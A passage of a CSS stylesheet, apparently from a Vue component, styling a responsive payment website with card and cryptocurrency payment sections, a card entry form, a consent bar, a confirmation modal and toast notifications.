  font-size: 14px; font-weight: 500;
  color: rgba(255,255,255,0.7);
  text-decoration: none;
  border-bottom: 1px solid rgba(255,255,255,0.04);
  transition: color 0.2s, padding-left 0.2s;
}
.drawer__link:hover, .drawer__link--active { color: #fff; padding-left: 24px; background: rgba(29,86,219,0.15); }

/* ─── Hero ─── */
.hero {
  position: relative;
  height: 440px;
  overflow: hidden;
  background: #0a1628;
}
.hero__slides { position: absolute; inset: 0; }
.hero__slide {
  position: absolute; inset: 0;
  background-size: cover; background-position: center 20%;
  transition: opacity 1s ease;
}
.hero__gradient {
  position: absolute; inset: 0;
  background: linear-gradient(90deg, rgba(10,22,40,0.92) 0%, rgba(10,22,40,0.65) 55%, rgba(10,22,40,0.2) 100%);
  z-index: 1;
}
.hero__content {
  position: relative; z-index: 2;
  height: 100%;
  display: flex;
  align-items: center;
}
.hero__text { max-width: 520px; }
.hero__badge {
  display: inline-block;
  background: rgba(29,86,219,0.25);
  border: 1px solid rgba(29,86,219,0.5);
  border-radius: 20px;
  padding: 4px 14px;
  font-size: 11px; font-weight: 600;
  color: #93b4f7;
  letter-spacing: 0.06em;
  margin-bottom: 14px;
}
.hero__title {
  font-family: 'Montserrat', sans-serif;
  font-size: 38px; font-weight: 900;
  line-height: 1.05; color: #fff;
  margin-bottom: 10px;
  text-shadow: 0 2px 16px rgba(0,0,0,0.4);
}
.hero__title--blue { color: #4d90f0; }
.hero__subtitle { font-size: 13px; font-weight: 600; color: rgba(255,255,255,0.7); margin-bottom: 10px; }
.hero__desc { font-size: 13px; color: rgba(255,255,255,0.6); line-height: 1.65; margin-bottom: 22px; max-width: 380px; }
.hero__btns { display: flex; flex-wrap: wrap; gap: 10px; }

.hero__dots {
  position: absolute; bottom: 18px; left: 50%; transform: translateX(-50%);
  display: flex; gap: 7px; z-index: 3;
}
.hero__dots button {
  width: 8px; height: 8px; border-radius: 50%;
  border: none; background: rgba(255,255,255,0.35);
  cursor: pointer; padding: 0; transition: all 0.3s;
}
.hero__dots button.active { background: #1d56db; width: 22px; border-radius: 4px; }

/* ─── Welcome bar ─── */
.welcome-bar {
  background: #1243b0;
  padding: 10px 0;
}
.welcome-bar__inner {
  display: flex; align-items: center;
  justify-content: space-between; gap: 12px;
  font-size: 13px; color: #fff;
}
.welcome-bar__inner strong { color: #93b4f7; }
.welcome-bar__inner button {
  background: none; border: none; color: rgba(255,255,255,0.6);
  cursor: pointer; font-size: 16px; flex-shrink: 0;
}
.welcome-bar__inner button:hover { color: #fff; }

/* ─── Features Bar ─── */
.features-bar {
  background: #0d1f38;
  border-top: 1px solid rgba(255,255,255,0.06);
  border-bottom: 1px solid rgba(255,255,255,0.06);
  padding: 16px 0;
}
.features-bar__grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 14px;
}
.feat { display: flex; align-items: center; gap: 10px; }
.feat__ico { font-size: 22px; flex-shrink: 0; }
.feat__title { font-size: 12px; font-weight: 700; color: #fff; }
.feat__sub { font-size: 11px; color: rgba(255,255,255,0.5); margin-top: 1px; }

/* ─── Section head ─── */
.sec-head { text-align: center; margin-bottom: 28px; }
.sec-head__title {
  font-family: 'Montserrat', sans-serif;
  font-size: 20px; font-weight: 900;
  color: #1a1a2e; letter-spacing: 0.04em; margin-bottom: 10px;
}
.sec-head__bar {
  width: 48px; height: 3px;
  background: #1d56db; border-radius: 2px;
  margin: 0 auto 12px;
}
.sec-head__sub { font-size: 13px; color: #6b7280; }

/* ─── Happy Customers ─── */
.customers-section { background: #f4f6fa; padding: 36px 0 32px; }
.customers-scroll {
  display: flex; gap: 10px;
  overflow-x: auto; scrollbar-width: none;
  padding-bottom: 4px;
}
.customers-scroll::-webkit-scrollbar { display: none; }
.customer-thumb {
  flex: 0 0 90px; height: 90px;
  border-radius: 10px;
  background-size: cover; background-position: center;
  border: 2px solid #e2e8f0;
  transition: transform 0.3s, border-color 0.3s;
}
.customer-thumb:hover { transform: scale(1.06); border-color: #1d56db; }

/* ─── Payments Section ─── */
.payments-section { background: #fff; padding: 52px 0 40px; }

.pay-grid {
  display: grid;
  grid-template-columns: 1fr;
  gap: 20px;
  margin-bottom: 36px;
}

.pay-card {
  background: #fff;
  border: 1px solid #e2e8f0;
  border-radius: 10px;
  overflow: hidden;
  cursor: pointer;
  transition: transform 0.25s, box-shadow 0.25s, border-color 0.25s;
  box-shadow: 0 2px 8px rgba(0,0,0,0.06);
}
.pay-card:hover {
  transform: translateY(-4px);
  box-shadow: 0 12px 36px rgba(29,86,219,0.15);
  border-color: #1d56db;
}
.pay-card__img-wrap { width: 100%; height: 180px; overflow: hidden; }
.pay-card__img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.4s; }
.pay-card:hover .pay-card__img { transform: scale(1.04); }
.pay-card__body { padding: 20px; }
.pay-card__title {
  font-family: 'Montserrat', sans-serif;
  font-size: 16px; font-weight: 900;
  color: #1a1a2e; letter-spacing: 0.03em; margin-bottom: 6px;
}
.pay-card__sub { font-size: 12px; color: #6b7280; margin-bottom: 14px; }
.pay-card__brands { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 16px; }
.brand {
  padding: 4px 10px; border-radius: 4px;
  font-size: 10px; font-weight: 800;
  letter-spacing: 0.05em; border: 1px solid;
}
.brand--visa   { background: #1a1f71; color: #fff; border-color: #1a1f71; }
.brand--mc     { background: #eb001b; color: #fff; border-color: #eb001b; }
.brand--amex   { background: #006fcf; color: #fff; border-color: #006fcf; }
.brand--maestro { background: #6d6d6d; color: #fff; border-color: #6d6d6d; }
.brand--btc    { background: #f7931a; color: #fff; border-color: #f7931a; }
.brand--eth    { background: #627eea; color: #fff; border-color: #627eea; }
.brand--ltc    { background: #bfbbbb; color: #333; border-color: #bfbbbb; }
.brand--usdt   { background: #26a17b; color: #fff; border-color: #26a17b; }

/* ─── Trust row ─── */
.trust-row {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 16px;
  padding-top: 12px;
  border-top: 1px solid #e2e8f0;
}
.trust-item { text-align: center; padding: 16px 8px; }
.trust-item__ico { font-size: 24px; display: block; margin-bottom: 8px; }
.trust-item__title { font-size: 11px; font-weight: 700; color: #1a1a2e; line-height: 1.4; margin-bottom: 3px; }
.trust-item__sub { font-size: 11px; color: #9ca3af; }

/* ─── About Section ─── */
.about-section { background: #f4f6fa; padding: 52px 0; }
.about-section__grid {
  display: grid;
  grid-template-columns: 1fr;
  gap: 28px;
}
.about-why__title {
  font-family: 'Montserrat', sans-serif;
  font-size: 15px; font-weight: 900;
  color: #1a1a2e; margin-bottom: 16px;
  padding-bottom: 10px;
  border-bottom: 2px solid #1d56db;
}
.about-why__list { list-style: none; display: flex; flex-direction: column; gap: 10px; }
.about-why__list li { font-size: 13px; color: #374151; }
.about-car__img { width: 100%; border-radius: 10px; object-fit: cover; height: 200px; display: block; }
.about-contact__title {
  font-family: 'Montserrat', sans-serif;
  font-size: 15px; font-weight: 900;
  color: #1a1a2e; margin-bottom: 16px;
  padding-bottom: 10px;
  border-bottom: 2px solid #1d56db;
}
.contact-item { display: flex; align-items: flex-start; gap: 10px; font-size: 13px; color: #374151; margin-bottom: 10px; }

/* ─── Finance Banner ─── */
.finance-banner { background: #0d1f38; padding: 28px 0; }
.finance-banner__inner {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 20px;
  flex-wrap: wrap;
}
.finance-banner__left { display: flex; align-items: center; gap: 14px; }
.finance-banner__ico { font-size: 32px; flex-shrink: 0; }
.finance-banner__title {
  font-family: 'Montserrat', sans-serif;
  font-size: 16px; font-weight: 900; color: #fff; margin-bottom: 4px;
}
.finance-banner__sub { font-size: 12px; color: rgba(255,255,255,0.55); line-height: 1.5; }
.finance-banner__btn { flex-shrink: 0; }

/* ─── CTA Banner ─── */
.cta-banner { background: #1d56db; padding: 32px 0; }
.cta-banner__inner {
  display: flex; align-items: center;
  justify-content: space-between;
  gap: 20px; flex-wrap: wrap;
}
.cta-banner__title {
  font-family: 'Montserrat', sans-serif;
  font-size: 18px; font-weight: 900; color: #fff; margin-bottom: 4px;
}
.cta-banner__sub { font-size: 12px; color: rgba(255,255,255,0.7); }
.cta-banner__btn { flex-shrink: 0; background: #fff; color: #1d56db; }
.cta-banner__btn:hover { background: #f0f4ff; }

/* ─── Footer ─── */
.footer { background: #0a1628; padding: 52px 0 0; }
.footer__grid {
  display: grid;
  grid-template-columns: 1fr;
  gap: 32px;
  padding-bottom: 40px;
  border-bottom: 1px solid rgba(255,255,255,0.07);
}
.footer__logo { display: flex; align-items: center; gap: 10px; margin-bottom: 14px; }
.footer__logo-img { width: 42px; height: 42px; border-radius: 50%; object-fit: cover; border: 2px solid #1d56db; }
.footer__logo-name { display: block; font-family: 'Montserrat', sans-serif; font-size: 14px; font-weight: 900; color: #fff; letter-spacing: 0.05em; }
.footer__logo-sub { display: block; font-size: 8px; font-weight: 700; color: #1d56db; letter-spacing: 0.18em; }
.footer__desc { font-size: 12px; color: rgba(255,255,255,0.45); line-height: 1.8; }
.footer__heading { font-family: 'Montserrat', sans-serif; font-size: 11px; font-weight: 800; color: #fff; letter-spacing: 0.12em; margin-bottom: 14px; }
.footer__link { display: block; font-size: 13px; color: rgba(255,255,255,0.45); text-decoration: none; margin-bottom: 8px; transition: color 0.2s; }
.footer__link:hover { color: #4d90f0; }
.footer__contact { font-size: 12px; color: rgba(255,255,255,0.45); margin-bottom: 8px; line-height: 1.5; }
.footer__socials { display: flex; gap: 8px; }
.footer__soc {
  width: 36px; height: 36px; border-radius: 6px;
  display: flex; align-items: center; justify-content: center;
  font-size: 13px; font-weight: 800;
  text-decoration: none; transition: opacity 0.2s;
}
.footer__soc:hover { opacity: 0.85; }
.footer__soc--fb { background: #1877f2; color: #fff; }
.footer__soc--ig { background: #e1306c; color: #fff; }
.footer__soc--wa { background: #25d366; color: #fff; }
.footer__soc--yt { background: #ff0000; color: #fff; }
.footer__bottom { background: #06111f; padding: 16px 0; }
.footer__bottom-inner {
  display: flex; align-items: center;
  justify-content: space-between; flex-wrap: wrap; gap: 8px;
  font-size: 11px; color: rgba(255,255,255,0.3);
}

/* ─── Form header ─── */
.form-header { background: #0d1f38; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 12px rgba(0,0,0,0.3); }
.form-header__inner { display: flex; align-items: center; justify-content: space-between; height: 58px; gap: 12px; }
.form-header__back { background: none; border: none; color: rgba(255,255,255,0.7); font-size: 14px; font-weight: 500; cursor: pointer; transition: color 0.2s; padding: 0; flex-shrink: 0; }
.form-header__back:hover { color: #fff; }
.form-header__logo { display: flex; align-items: center; gap: 8px; }
.form-header__img { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; border: 1.5px solid #1d56db; }
.form-header__name { display: block; font-family: 'Montserrat', sans-serif; font-size: 12px; font-weight: 900; color: #fff; letter-spacing: 0.06em; }
.form-header__sub { display: block; font-size: 7px; font-weight: 700; color: #4d90f0; letter-spacing: 0.18em; }
.ssl-badge { font-size: 11px; color: #4ade80; background: rgba(74,222,128,0.1); border: 1px solid rgba(74,222,128,0.25); border-radius: 20px; padding: 4px 10px; flex-shrink: 0; }

/* ─── Form notice ─── */
.form-notice { background: #eff6ff; border-bottom: 1px solid #bfdbfe; }
.form-notice__inner { display: flex; align-items: flex-start; gap: 8px; padding-top: 10px; padding-bottom: 10px; font-size: 13px; color: #1e40af; line-height: 1.5; }
.form-notice__inner strong { color: #1d56db; }

/* ─── Card preview section ─── */
.card-preview-section { background: #f4f6fa; padding: 20px 0 0; }

/* ─── Form wrap ─── */
.form-wrap { background: #fff; padding: 24px 16px 48px; }

.amount-pill {
  display: flex; align-items: center; justify-content: space-between;
  background: #f0f4ff; border: 1.5px solid #bfdbfe;
  border-radius: 10px; padding: 14px 18px; margin-bottom: 24px;
}
.amount-pill__label { font-size: 12px; color: #6b7280; }
.amount-pill__value { font-family: 'Montserrat', sans-serif; font-size: 26px; font-weight: 800; color: #1d56db; }

.form-section-title {
  font-family: 'Montserrat', sans-serif;
  font-size: 12px; font-weight: 700;
  letter-spacing: 0.1em; text-transform: uppercase;
  color: #1d56db; padding-bottom: 8px;
  border-bottom: 2px solid #e2e8f0; margin-bottom: 16px;
}

.fgroup { margin-bottom: 14px; }
.frow { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
.frow .fgroup { margin-bottom: 14px; }

label { display: block; font-size: 11px; font-weight: 600; letter-spacing: 0.07em; text-transform: uppercase; color: #6b7280; margin-bottom: 6px; }
.optional { font-size: 10px; font-weight: 400; color: #9ca3af; text-transform: none; letter-spacing: 0; }

.finput-wrap { position: relative; }
.finput-ico { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); font-size: 14px; pointer-events: none; }

.finput-wrap input {
  width: 100%;
  background: #f9fafb;
  border: 1.5px solid #e2e8f0;
  border-radius: 8px;
  padding: 12px 12px 12px 40px;
  font-family: 'Inter', sans-serif;
  font-size: 14px; font-weight: 500; color: #1a1a2e;
  outline: none;
  transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
  -webkit-appearance: none;
  appearance: none;
}
.finput-wrap input::placeholder { color: #9ca3af; }
.finput-wrap input:focus { border-color: #1d56db; background: #fff; box-shadow: 0 0 0 3px rgba(29,86,219,0.1); }
.fgroup.error .finput-wrap input { border-color: #ef4444; }
.ferr { font-size: 11px; color: #ef4444; margin-top: 4px; }

.save-toggle {
  display: flex; align-items: flex-start; gap: 10px; cursor: pointer;
  background: #f0f4ff; border: 1px solid #bfdbfe; border-radius: 8px;
  padding: 12px 14px; margin: 14px 0 20px;
}
.save-toggle input[type="checkbox"] { margin-top: 2px; accent-color: #1d56db; width: 15px; height: 15px; flex-shrink: 0; }
.save-toggle span { font-size: 13px; color: #374151; line-height: 1.5; }

.accepted-cards { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; margin-top: 16px; }
.accepted-cards span {
  background: #f4f6fa; border: 1px solid #e2e8f0;
  border-radius: 4px; padding: 4px 12px;
  font-size: 10px; font-weight: 800; color: #6b7280; letter-spacing: 0.06em;
}

/* ─── Crypto ─── */
.crypto-hero { position: relative; height: 180px; overflow: hidden; }
.crypto-hero__img { width: 100%; height: 100%; object-fit: cover; object-position: center 20%; }
.crypto-hero__overlay {
  position: absolute; inset: 0;
  background: rgba(10,22,40,0.75);
  display: flex; align-items: center;
}
.crypto-hero__symbol { font-size: 32px; color: #f59e0b; margin-bottom: 6px; }
.crypto-hero__title { font-family: 'Montserrat', sans-serif; font-size: 18px; font-weight: 900; color: #fff; letter-spacing: 0.03em; margin-bottom: 4px; }
.crypto-hero__sub { font-size: 12px; color: rgba(255,255,255,0.5); letter-spacing: 0.12em; }

.crypto-coins { display: grid; grid-template-columns: repeat(4,1fr); gap: 8px; margin-bottom: 24px; }
.crypto-coin {
  background: #fff9f0; border: 1px solid #fed7aa;
  border-radius: 8px; padding: 10px 4px;
  text-align: center; font-size: 14px; font-weight: 700; color: #c2410c;
}
.crypto-coin span { font-size: 10px; font-weight: 600; color: #9a3412; display: block; margin-top: 2px; }

.crypto-note {
  background: #eff6ff; border: 1px solid #bfdbfe;
  border-radius: 8px; padding: 12px 16px;
  font-size: 13px; color: #1e40af; line-height: 1.6; margin-bottom: 12px;
}

/* ─── Consent ─── */
.consent-bar {
  position: fixed; bottom: 0; left: 0; right: 0; z-index: 9000;
  background: #0d1f38; border-top: 2px solid #1d56db;
  box-shadow: 0 -8px 32px rgba(0,0,0,0.4);
}
.consent-bar__inner { display: flex; flex-direction: column; gap: 14px; padding: 18px 16px; }
.consent-bar__text { display: flex; gap: 10px; font-size: 13px; color: rgba(255,255,255,0.8); line-height: 1.6; align-items: flex-start; }
.consent-bar__text strong { color: #93b4f7; }
.consent-bar__text em { color: #4ade80; font-style: normal; font-weight: 600; }
.consent-bar__btns { display: flex; gap: 10px; }
.consent-bar__btns .btn { flex: 1; }
.consent-bar__decline {
  flex: 1; background: transparent;
  border: 1px solid rgba(255,255,255,0.2); border-radius: 6px;
  color: rgba(255,255,255,0.5); font-size: 13px; cursor: pointer;
  transition: all 0.2s;
}
.consent-bar__decline:hover { border-color: rgba(255,255,255,0.5); color: #fff; }

/* ─── Modal ─── */
.modal-overlay {
  position: fixed; inset: 0; z-index: 9999;
  background: rgba(10,22,40,0.88);
  display: flex; align-items: center; justify-content: center;
  padding: 20px; backdrop-filter: blur(8px);
}
.modal {
  background: #fff; border-radius: 16px;
  padding: 28px 24px; max-width: 400px; width: 100%;
  text-align: center; box-shadow: 0 32px 80px rgba(0,0,0,0.4);
  max-height: 90vh; overflow-y: auto;
}
.modal__logo { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 16px; }
.modal__logo img { width: 42px; height: 42px; border-radius: 50%; object-fit: cover; border: 2px solid #1d56db; }
.modal__logo-name { display: block; font-family: 'Montserrat', sans-serif; font-size: 14px; font-weight: 900; color: #0a1628; }
.modal__logo-sub { display: block; font-size: 8px; font-weight: 700; color: #1d56db; letter-spacing: 0.18em; }
.modal__check {
  width: 64px; height: 64px;
  background: #16a34a; border-radius: 50%;
  display: flex; align-items: center; justify-content: center;
  font-size: 26px; color: #fff; margin: 0 auto 16px;
  box-shadow: 0 6px 20px rgba(22,163,74,0.4);
  animation: pop 0.5s cubic-bezier(0.34,1.56,0.64,1);
}
@keyframes pop { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
.modal__title { font-family: 'Montserrat', sans-serif; font-size: 20px; font-weight: 900; color: #0a1628; margin-bottom: 8px; }
.modal__msg { font-size: 13px; color: #6b7280; line-height: 1.65; margin-bottom: 18px; }
.modal__msg strong { color: #1d56db; }
.modal__ref { background: #f0f4ff; border: 1px solid #bfdbfe; border-radius: 10px; padding: 14px; margin-bottom: 14px; }
.modal__ref-label { display: block; font-size: 10px; font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase; color: #9ca3af; margin-bottom: 5px; }
.modal__ref-num { font-family: 'Montserrat', sans-serif; font-size: 18px; font-weight: 800; color: #1d56db; }
.modal__saved {
  display: flex; align-items: flex-start; gap: 10px; text-align: left;
  background: #f0fdf4; border: 1px solid #bbf7d0;
  border-radius: 10px; padding: 14px; margin-bottom: 20px;
}
.modal__saved-title { font-size: 13px; font-weight: 700; color: #15803d; margin-bottom: 3px; }
.modal__saved-body { font-size: 12px; color: #6b7280; line-height: 1.5; }

/* ─── Toast ─── */
.toast {
  position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);
  background: #1a1a2e; border-radius: 8px;
  padding: 12px 20px; font-size: 13px; font-weight: 500; color: #fff;
  box-shadow: 0 8px 32px rgba(0,0,0,0.3); z-index: 9998;
  white-space: nowrap; max-width: calc(100vw - 32px);
}
.toast--success { border-left: 3px solid #16a34a; }
.toast--error { border-left: 3px solid #ef4444; }

/* ─── Transitions ─── */
.hfade-enter-active, .hfade-leave-active { transition: opacity 0.5s, transform 0.5s; }
.hfade-enter-from { opacity: 0; transform: translateY(12px); }
.hfade-leave-to { opacity: 0; transform: translateY(-8px); }
.drawer-enter-active, .drawer-leave-active { transition: opacity 0.2s, transform 0.2s; }
.drawer-enter-from, .drawer-leave-to { opacity: 0; transform: translateY(-6px); }
.slidedown-enter-active, .slidedown-leave-active { transition: all 0.3s; }
.slidedown-enter-from, .slidedown-leave-to { transform: translateY(-100%); opacity: 0; }
.slideup-enter-active, .slideup-leave-active { transition: transform 0.35s ease; }
.slideup-enter-from, .slideup-leave-to { transform: translateY(100%); }
.fade-enter-active, .fade-leave-active { transition: opacity 0.3s; }
.fade-enter-from, .fade-leave-to { opacity: 0; }
.toast-enter-active, .toast-leave-active { transition: all 0.3s cubic-bezier(0.34,1.56,0.64,1); }
.toast-enter-from, .toast-leave-to { opacity: 0; transform: translateX(-50%) translateY(14px); }

/* ════════════════════════════════
   RESPONSIVE
════════════════════════════════ */

/* 480px */
@media (min-width: 480px) {
  .wrap { padding: 0 20px; }
  .hero { height: 480px; }
  .hero__title { font-size: 44px; }
  .customer-thumb { flex: 0 0 110px; height: 110px; }
  .pay-card__img-wrap { height: 200px; }
  .form-wrap { padding: 28px 20px 52px; }
}

/* 640px */
@media (min-width: 640px) {
  .wrap { padding: 0 28px; }
  .topbar__inner { flex-direction: row; }
  .hero { height: 500px; }
  .hero__title { font-size: 48px; }
  .features-bar__grid { grid-template-columns: repeat(4,1fr); }
  .pay-grid { grid-template-columns: 1fr 1fr; }
  .trust-row { grid-template-columns: repeat(4, 1fr); }
  .about-section__grid { grid-template-columns: 1fr 1fr; }
  .footer__grid { grid-template-columns: 1fr 1fr; }
  .customer-thumb { flex: 0 0 120px; height: 120px; }
  .form-wrap { padding: 32px 28px 56px; }
}

/* 768px — tablet */
@media (min-width: 768px) {
  .wrap { padding: 0 32px; }
  /* Show nav, hide burger */
  .nav { display: flex; }
  .burger { display: none; }
  .header__inner { height: 68px; }

  .hero { height: 540px; }
  .hero__title { font-size: 54px; }
  .hero__content { padding-bottom: 0; }

  .sec-head__title { font-size: 24px; }
  .about-section__grid { grid-template-columns: 1fr auto 1fr; gap: 32px; }
  .about-car { display: block; }
  .about-car__img { height: 240px; width: 220px; }

  .finance-banner__inner { flex-wrap: nowrap; }
  .cta-banner__title { font-size: 20px; }

  .footer__grid { grid-template-columns: 1.6fr 1fr 1fr 1fr 0.8fr; gap: 28px; }
  .footer__brand { grid-column: auto; }

  .form-wrap { max-width: 680px; margin: 0 auto; padding: 32px 40px 60px; }
  .card-preview-section .wrap { max-width: 680px; }
  .consent-bar__inner { flex-direction: row; align-items: center; padding: 18px 32px; }
  .consent-bar__text { flex: 1; }
  .consent-bar__btns { flex-shrink: 0; flex-direction: column; min-width: 160px; }
}

/* 1024px — desktop */
@media (min-width: 1024px) {
  .wrap { padding: 0 40px; }
  .header__inner { height: 72px; }
  .logo__img { width: 44px; height: 44px; }
  .logo__name { font-size: 16px; }

  .hero { height: 600px; }
  .hero__title { font-size: 62px; }
  .hero__desc { font-size: 14px; }

  .payments-section { padding: 64px 0 52px; }
  .pay-grid { gap: 28px; }
  .pay-card__img-wrap { height: 230px; }
  .pay-card__title { font-size: 18px; }

  .sec-head__title { font-size: 26px; }

  .about-section { padding: 64px 0; }
  .about-car__img { height: 280px; width: 260px; }

  .form-wrap { max-width: 740px; padding: 36px 56px 64px; }
  .customer-thumb { flex: 0 0 140px; height: 140px; }
}

/* 1280px — wide desktop */
@media (min-width: 1280px) {
  .wrap { padding: 0 60px; }
  .hero { height: 660px; }
  .hero__title { font-size: 72px; }
  .pay-card__img-wrap { height: 260px; }
  .cta-banner__title { font-size: 22px; }
  .form-wrap { max-width: 800px; }
}

/* Very small < 360px */
@media (max-width: 359px) {
  .hero { height: 400px; }
  .hero__title { font-size: 30px; }
  .hero__btns { flex-direction: column; }
  .btn { padding: 10px 16px; font-size: 12px; }
  .features-bar__grid { grid-template-columns: 1fr; gap: 10px; }
  .pay-card__img-wrap { height: 150px; }
  .frow { grid-template-columns: 1fr; }
  .form-header__logo div { display: none; }
  .coin-grid { grid-template-columns: 1fr 1fr; }
  .amount-pill__value { font-size: 22px; }
}
</style>
